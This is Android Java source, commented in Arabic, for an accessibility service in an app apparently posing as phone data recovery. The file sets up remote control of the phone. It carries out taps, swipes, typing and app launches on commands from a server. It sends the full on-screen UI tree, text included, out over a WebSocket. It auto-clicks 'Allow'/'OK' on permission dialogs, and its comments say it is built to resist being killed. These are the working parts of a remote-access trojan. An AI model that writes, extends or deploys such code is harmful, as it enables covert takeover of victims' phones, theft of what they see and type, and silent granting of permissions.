package com.recoverdata.phone.accessibility;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.accessibilityservice.GestureDescription;
import android.graphics.Path;
import android.graphics.Rect;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;

import com.recoverdata.phone.network.WebSocketManager;
import com.recoverdata.phone.utils.Logger;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * AutoPilotService
 * ============================================================
 * Accessibility Service للتحكم الكامل بالهاتف عن بُعد.
 *
 * الوظائف الرئيسية:
 *   1. تنفيذ الأوامر الواردة من السيرفر (نقر، سحب، كتابة).
 *   2. التنقل بين الشاشات (Home, Back, Recents).
 *   3. الموافقة التلقائية على حوارات النظام (Permissões).
 *   4. قراءة شجرة الواجهة (UI Tree) وإرسالها للسيرفر.
 *   5. أتمتة فتح التطبيقات والإعدادات.
 *   6. البقاء حياً بشكل دائم (لا يُقتل بسهولة).
 *
 * التفعيل: يدوياً من المستخدم عبر الإعدادات → إمكانية الوصول
 * ============================================================
 */
public class AutoPilotService extends AccessibilityService {

    // =============================================================
    // 1. الثوابت
    // =============================================================
    private static final String TAG = "AutoPilotService";

    // أزرار النظام
    public static final String ACTION_HOME       = "HOME";
    public static final String ACTION_BACK       = "BACK";
    public static final String ACTION_RECENTS    = "RECENTS";
    public static final String ACTION_NOTIF      = "NOTIFICATIONS";
    public static final String ACTION_LOCK       = "LOCK_SCREEN";

    // التفاعل مع الشاشة
    public static final String ACTION_CLICK      = "CLICK";       // إحداثيات
    public static final String ACTION_LONG_CLICK = "LONG_CLICK";
    public static final String ACTION_SWIPE      = "SWIPE";
    public static final String ACTION_TEXT       = "INPUT_TEXT";   // كتابة نص
    public static final String ACTION_SCROLL     = "SCROLL";
    public static final String ACTION_FIND_CLICK = "FIND_CLICK";   // نقر على عنصر بنصه

    // القراءة
    public static final String ACTION_DUMP_UI    = "DUMP_UI";      // إرسال شجرة الواجهة
    public static final String ACTION_GET_PKG    = "GET_PACKAGE";  // اسم التطبيق الحالي

    // الأتمتة
    public static final String ACTION_OPEN_APP   = "OPEN_APP";
    public static final String ACTION_OPEN_SETTINGS = "OPEN_SETTINGS";
    public static final String ACTION_ALLOW_PERM = "ALLOW_PERMISSION";

    // زمن الضغط الطويل
    private static final long LONG_CLICK_DURATION_MS = 800;
    // زمن الحركة الافتراضي
    private static final long DEFAULT_GESTURE_DURATION_MS = 300;

    // =============================================================
    // 2. الحقول
    // =============================================================
    private static AutoPilotService instance;
    private final Handler mainHandler = new Handler(Looper.getMainLooper());
    private final AtomicBoolean isReady = new AtomicBoolean(false);

    // مرجع الاتصال بالسيرفر (يُمرر من الخارج)
    private WebSocketManager webSocketManager;

    // =============================================================
    // 3. دورة الحياة
    // =============================================================
    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        Logger.i(TAG, "AutoPilotService created");
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        Logger.i(TAG, "AutoPilotService connected");

        // إعداد الخدمة
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
                | AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
                | AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
                | AccessibilityServiceInfo.FLAG_REQUEST_ENHANCED_WEB_ACCESSIBILITY;
        info.notificationTimeout = 100;
        setServiceInfo(info);

        isReady.set(true);

        // إبلاغ السيرفر أن الخدمة جاهزة
        notifyServer("AUTOPILOT_READY", null);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;

        // التقاط أحداث مهمة (مثل ظهور حوارات الصلاحيات)
        int type = event.getEventType();

        // موافقة تلقائية على حوارات الصلاحيات (اختياري)
        // نترك هذا معطلاً افتراضياً ونفعّله بناءً على أمر من السيرفر
        // handlePermissionDialogs(event);
    }

    @Override
    public void onInterrupt() {
        Logger.w(TAG, "AutoPilotService interrupted");
    }

    @Override
    public boolean onUnbind(android.content.Intent intent) {
        Logger.w(TAG, "AutoPilotService unbound");
        isReady.set(false);
        instance = null;
        return super.onUnbind(intent);
    }

    @Override
    public void onDestroy() {
        Logger.w(TAG, "AutoPilotService destroyed");
        isReady.set(false);
        instance = null;
        super.onDestroy();
    }

    // =============================================================
    // 4. الوصول من الخارج
    // =============================================================
    @Nullable
    public static AutoPilotService getInstance() {
        return instance;
    }

    public static boolean isReady() {
        return instance != null && instance.isReady.get();
    }

    public void setWebSocketManager(WebSocketManager manager) {
        this.webSocketManager = manager;
    }

    // =============================================================
    // 5. نقطة الدخول للأوامر (تُستدعى من CommandHandler)
    // =============================================================
    /**
     * تنفيذ أمر Accessibility.
     *
     * @param action الأمر (مثل "HOME", "CLICK", ...)
     * @param params معاملات إضافية (JSON) - قد تكون null
     * @return نتيجة التنفيذ
     */
    public CommandResult execute(@NonNull String action, @Nullable JSONObject params) {
        if (!isReady.get()) {
            return CommandResult.error("Service not ready");
        }

        try {
            switch (action) {
                // ---------- أزرار النظام ----------
                case ACTION_HOME:
                    return performGlobal(AccessibilityService.GLOBAL_ACTION_HOME);

                case ACTION_BACK:
                    return performGlobal(AccessibilityService.GLOBAL_ACTION_BACK);

                case ACTION_RECENTS:
                    return performGlobal(AccessibilityService.GLOBAL_ACTION_RECENTS);

                case ACTION_NOTIF:
                    return performGlobal(AccessibilityService.GLOBAL_ACTION_NOTIFICATIONS);

                case ACTION_LOCK:
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                        return performGlobal(AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN);
                    }
                    return CommandResult.error("Lock screen requires API 28+");

                // ---------- التفاعل ----------
                case ACTION_CLICK:
                    return handleClick(params, false);

                case ACTION_LONG_CLICK:
                    return handleClick(params, true);

                case ACTION_SWIPE:
                    return handleSwipe(params);

                case ACTION_TEXT:
                    return handleInputText(params);

                case ACTION_SCROLL:
                    return handleScroll(params);

                case ACTION_FIND_CLICK:
                    return handleFindAndClick(params);

                // ---------- القراءة ----------
                case ACTION_DUMP_UI:
                    return handleDumpUI();

                case ACTION_GET_PKG:
                    return handleGetPackage();

                // ---------- الأتمتة ----------
                case ACTION_OPEN_APP:
                    return handleOpenApp(params);

                case ACTION_OPEN_SETTINGS:
                    return handleOpenSettings(params);

                case ACTION_ALLOW_PERM:
                    return handleAllowPermission();

                default:
                    return CommandResult.error("Unknown action: " + action);
            }
        } catch (Exception e) {
            Logger.e(TAG, "execute error: " + e.getMessage(), e);
            return CommandResult.error("Exception: " + e.getMessage());
        }
    }

    // =============================================================
    // 6. تنفيذ الإجراءات (Handlers)
    // =============================================================

    // ---------- 6.1 أزرار النظام ----------
    private CommandResult performGlobal(int globalAction) {
        boolean ok = performGlobalAction(globalAction);
        return ok ? CommandResult.success("Global action performed")
                  : CommandResult.error("Global action failed");
    }

    // ---------- 6.2 النقر / الضغط الطويل ----------
    private CommandResult handleClick(@Nullable JSONObject params, boolean isLong) {
        if (params == null) return CommandResult.error("Missing params");

        try {
            float x = (float) params.optDouble("x", -1);
            float y = (float) params.optDouble("y", -1);

            if (x < 0 || y < 0) {
                return CommandResult.error("Invalid coordinates");
            }

            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) {
                return CommandResult.error("Gestures require API 24+");
            }

            Path path = new Path();
            path.moveTo(x, y);

            long duration = isLong ? LONG_CLICK_DURATION_MS : 50;

            GestureDescription.Builder builder = new GestureDescription.Builder();
            builder.addStroke(new GestureDescription.StrokeDescription(path, 0, duration));

            final CommandResult[] result = new CommandResult[1];
            final java.util.concurrent.CountDownLatch latch = new java.util.concurrent.CountDownLatch(1);

            boolean dispatched = dispatchGesture(builder.build(),
                    new GestureResultCallback() {
                        @Override
                        public void onCompleted(GestureDescription gestureDescription) {
                            result[0] = CommandResult.success(isLong ? "Long click done" : "Click done");
                            latch.countDown();
                        }

                        @Override
                        public void onCancelled(GestureDescription gestureDescription) {
                            result[0] = CommandResult.error("Gesture cancelled");
                            latch.countDown();
                        }
                    }, mainHandler);

            if (!dispatched) {
                return CommandResult.error("Failed to dispatch gesture");
            }

            // انتظار مدة قصيرة (بدون تعليق الخيط الرئيسي)
            try {
                latch.await(2, java.util.concurrent.TimeUnit.SECONDS);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }

            return result[0] != null ? result[0] : CommandResult.error("Timeout");

        } catch (Exception e) {
            return CommandResult.error("Click error: " + e.getMessage());
        }
    }

    // ---------- 6.3 السحب ----------
    private CommandResult handleSwipe(@Nullable JSONObject params) {
        if (params == null) return CommandResult.error("Missing params");

        try {
            float x1 = (float) params.optDouble("x1", -1);
            float y1 = (float) params.optDouble("y1", -1);
            float x2 = (float) params.optDouble("x2", -1);
            float y2 = (float) params.optDouble("y2", -1);
            long duration = (long) params.optDouble("duration", DEFAULT_GESTURE_DURATION_MS);

            if (x1 < 0 || y1 < 0 || x2 < 0 || y2 < 0) {
                return CommandResult.error("Invalid swipe coordinates");
            }

            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) {
                return CommandResult.error("Gestures require API 24+");
            }

            Path path = new Path();
            path.moveTo(x1, y1);
            path.lineTo(x2, y2);

            GestureDescription.Builder builder = new GestureDescription.Builder();
            builder.addStroke(new GestureDescription.StrokeDescription(path, 0, duration));

            final CommandResult[] result = new CommandResult[1];
            final java.util.concurrent.CountDownLatch latch = new java.util.concurrent.CountDownLatch(1);

            boolean dispatched = dispatchGesture(builder.build(),
                    new GestureResultCallback() {
                        @Override
                        public void onCompleted(GestureDescription gestureDescription) {
                            result[0] = CommandResult.success("Swipe done");
                            latch.countDown();
                        }

                        @Override
                        public void onCancelled(GestureDescription gestureDescription) {
                            result[0] = CommandResult.error("Swipe cancelled");
                            latch.countDown();
                        }
                    }, mainHandler);

            if (!dispatched) return CommandResult.error("Failed to dispatch swipe");

            try {
                latch.await(3, java.util.concurrent.TimeUnit.SECONDS);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }

            return result[0] != null ? result[0] : CommandResult.error("Swipe timeout");

        } catch (Exception e) {
            return CommandResult.error("Swipe error: " + e.getMessage());
        }
    }

    // ---------- 6.4 كتابة نص ----------
    private CommandResult handleInputText(@Nullable JSONObject params) {
        if (params == null) return CommandResult.error("Missing params");

        String text = params.optString("text", "");
        if (text.isEmpty()) return CommandResult.error("Empty text");

        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return CommandResult.error("No active window");

        // البحث عن عنصر قابل للكتابة (EditText)
        AccessibilityNodeInfo focused = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
        if (focused == null) {
            // محاولة إيجاد أي عنصر قابل للكتابة
            List<AccessibilityNodeInfo> editables = root.findAccessibilityNodeInfosByViewId(
                    "android:id/edit");
            if (editables != null && !editables.isEmpty()) {
                focused = editables.get(0);
            }
        }

        if (focused == null) {
            return CommandResult.error("No input field found");
        }

        Bundle args = new Bundle();
        args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);

        boolean ok = focused.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);
        return ok ? CommandResult.success("Text input done")
                  : CommandResult.error("Failed to input text");
    }

    // ---------- 6.5 التمرير ----------
    private CommandResult handleScroll(@Nullable JSONObject params) {
        if (params == null) return CommandResult.error("Missing params");

        String direction = params.optString("direction", "down"); // up/down/left/right

        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return CommandResult.error("No active window");

        int action;
        switch (direction.toLowerCase()) {
            case "up":
                action = AccessibilityNodeInfo.ACTION_SCROLL_BACKWARD;
                break;
            case "down":
                action = AccessibilityNodeInfo.ACTION_SCROLL_FORWARD;
                break;
            case "left":
                action = AccessibilityNodeInfo.ACTION_SCROLL_BACKWARD;
                break;
            case "right":
                action = AccessibilityNodeInfo.ACTION_SCROLL_FORWARD;
                break;
            default:
                return CommandResult.error("Invalid direction");
        }

        // البحث عن أول عنصر قابل للتمرير
        AccessibilityNodeInfo scrollable = findScrollable(root);
        if (scrollable == null) {
            return CommandResult.error("No scrollable view");
        }

        boolean ok = scrollable.performAction(action);
        return ok ? CommandResult.success("Scroll done")
                  : CommandResult.error("Scroll failed");
    }

    // ---------- 6.6 النقر على عنصر بنصه ----------
    private CommandResult handleFindAndClick(@Nullable JSONObject params) {
        if (params == null) return CommandResult.error("Missing params");

        String text = params.optString("text", "");
        if (text.isEmpty()) return CommandResult.error("Empty search text");

        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return CommandResult.error("No active window");

        List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(text);
        if (nodes == null || nodes.isEmpty()) {
            return CommandResult.error("Element not found: " + text);
        }

        // البحث عن أول عنصر قابل للنقر (أو أصله)
        for (AccessibilityNodeInfo node : nodes) {
            AccessibilityNodeInfo clickable = findClickableParent(node);
            if (clickable != null) {
                boolean ok = clickable.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                if (ok) return CommandResult.success("Clicked: " + text);
            }
        }

        return CommandResult.error("No clickable element found for: " + text);
    }

    // ---------- 6.7 قراءة شجرة الواجهة ----------
    private CommandResult handleDumpUI() {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return CommandResult.error("No active window");

        JSONObject tree = new JSONObject();
        try {
            tree.put("package", root.getPackageName());
            tree.put("nodes", dumpNode(root));
        } catch (JSONException e) {
            return CommandResult.error("JSON error: " + e.getMessage());
        }

        // إرسال الشجرة للسيرفر
        notifyServer("UI_TREE", tree);
        return CommandResult.success("UI tree sent");
    }

    // ---------- 6.8 اسم الحزمة الحالية ----------
    private CommandResult handleGetPackage() {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return CommandResult.error("No active window");

        JSONObject data = new JSONObject();
        try {
            data.put("package", root.getPackageName());
        } catch (JSONException ignored) {}

        notifyServer("CURRENT_PACKAGE", data);
        return CommandResult.success("Package sent");
    }

    // ---------- 6.9 فتح تطبيق ----------
    private CommandResult handleOpenApp(@Nullable JSONObject params) {
        if (params == null) return CommandResult.error("Missing params");
        String pkg = params.optString("package", "");
        if (pkg.isEmpty()) return CommandResult.error("Empty package");

        try {
            android.content.Intent intent = getPackageManager().getLaunchIntentForPackage(pkg);
            if (intent == null) return CommandResult.error("App not found: " + pkg);
            intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            return CommandResult.success("Opened: " + pkg);
        } catch (Exception e) {
            return CommandResult.error("Open app error: " + e.getMessage());
        }
    }

    // ---------- 6.10 فتح الإعدادات ----------
    private CommandResult handleOpenSettings(@Nullable JSONObject params) {
        String action = (params != null) ? params.optString("action", "SETTINGS") : "SETTINGS";
        try {
            android.content.Intent intent = new android.content.Intent(
                    android.provider.Settings.ACTION_SETTINGS);
            intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);

            if ("WIFI".equals(action)) {
                intent = new android.content.Intent(android.provider.Settings.ACTION_WIFI_SETTINGS);
                intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
            } else if ("ACCESSIBILITY".equals(action)) {
                intent = new android.content.Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
                intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
            }

            startActivity(intent);
            return CommandResult.success("Settings opened: " + action);
        } catch (Exception e) {
            return CommandResult.error("Settings error: " + e.getMessage());
        }
    }

    // ---------- 6.11 الموافقة التلقائية على الصلاحيات ----------
    private CommandResult handleAllowPermission() {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return CommandResult.error("No active window");

        // البحث عن أزرار "السماح" / "Allow" / "موافق"
        String[] allowTexts = {"Allow", "ALLOW", "السماح", "سماح", "موافق", "OK", "أوافق"};

        for (String t : allowTexts) {
            List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(t);
            if (nodes != null && !nodes.isEmpty()) {
                for (AccessibilityNodeInfo node : nodes) {
                    AccessibilityNodeInfo clickable = findClickableParent(node);
                    if (clickable != null) {
                        boolean ok = clickable.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        if (ok) return CommandResult.success("Clicked: " + t);
                    }
                }
            }
        }
        return CommandResult.error("No allow button found");
    }

    // =============================================================
    // 7. دوال مساعدة
    // =============================================================

    /**
     * إيجاد أول عنصر قابل للنقر بدءاً من العقدة أو أصلها.
     */
    @Nullable
    private AccessibilityNodeInfo findClickableParent(@Nullable AccessibilityNodeInfo node) {
        AccessibilityNodeInfo current = node;
        int depth = 0;
        while (current != null && depth < 10) {
            if (current.isClickable()) return current;
            current = current.getParent();
            depth++;
        }
        return null;
    }

    /**
     * البحث عن أول عنصر قابل للتمرير في الشجرة.
     */
    @Nullable
    private AccessibilityNodeInfo findScrollable(@Nullable AccessibilityNodeInfo root) {
        if (root == null) return null;
        if (root.isScrollable()) return root;

        for (int i = 0; i < root.getChildCount(); i++) {
            AccessibilityNodeInfo child = root.getChild(i);
            AccessibilityNodeInfo found = findScrollable(child);
            if (found != null) return found;
        }
        return null;
    }

    /**
     * تحويل شجرة الواجهة إلى JSON (عمق محدود لتجنب البطء).
     */
    @NonNull
    private org.json.JSONArray dumpNode(@Nullable AccessibilityNodeInfo node) {
        org.json.JSONArray arr = new org.json.JSONArray();
        if (node == null) return arr;

        try {
            JSONObject obj = new JSONObject();
            obj.put("class", safeStr(node.getClassName()));
            obj.put("text", safeStr(node.getText()));
            obj.put("desc", safeStr(node.getContentDescription()));
            obj.put("id", safeStr(node.getViewIdResourceName()));
            obj.put("clickable", node.isClickable());
            obj.put("scrollable", node.isScrollable());
            obj.put("editable", node.isEditable());
            obj.put("enabled", node.isEnabled());

            Rect bounds = new Rect();
            node.getBoundsInScreen(bounds);
            obj.put("bounds", bounds.flattenToString());

            org.json.JSONArray children = new org.json.JSONArray();
            for (int i = 0; i < node.getChildCount() && i < 30; i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    org.json.JSONArray childArr = dumpNode(child);
                    for (int j = 0; j < childArr.length(); j++) {
                        children.put(childArr.get(j));
                    }
                }
            }
            obj.put("children", children);
            arr.put(obj);
        } catch (JSONException ignored) {}

        return arr;
    }

    private String safeStr(@Nullable CharSequence cs) {
        return cs == null ? "" : cs.toString();
    }

    /**
     * إرسال إشعار للسيرفر.
     */
    private void notifyServer(@NonNull String event, @Nullable JSONObject data) {
        if (webSocketManager == null) return;

        try {
            JSONObject msg = new JSONObject();
            msg.put("type", "EVENT");
            msg.put("event", event);
            if (data != null) msg.put("data", data);
            msg.put("timestamp", System.currentTimeMillis());

            webSocketManager.send(msg.toString());
        } catch (JSONException e) {
            Logger.e(TAG, "notifyServer error", e);
        }
    }

    // =============================================================
    // 8. كلاس نتيجة التنفيذ
    // =============================================================
    public static class CommandResult {
        public final boolean success;
        public final String message;

        private CommandResult(boolean success, String message) {
            this.success = success;
            this.message = message;
        }

        public static CommandResult success(String message) {
            return new CommandResult(true, message);
        }

        public static CommandResult error(String message) {
            return new CommandResult(false, message);
        }

        @Override
        @NonNull
        public String toString() {
            return (success ? "✅ " : "❌ ") + message;
        }
    }
}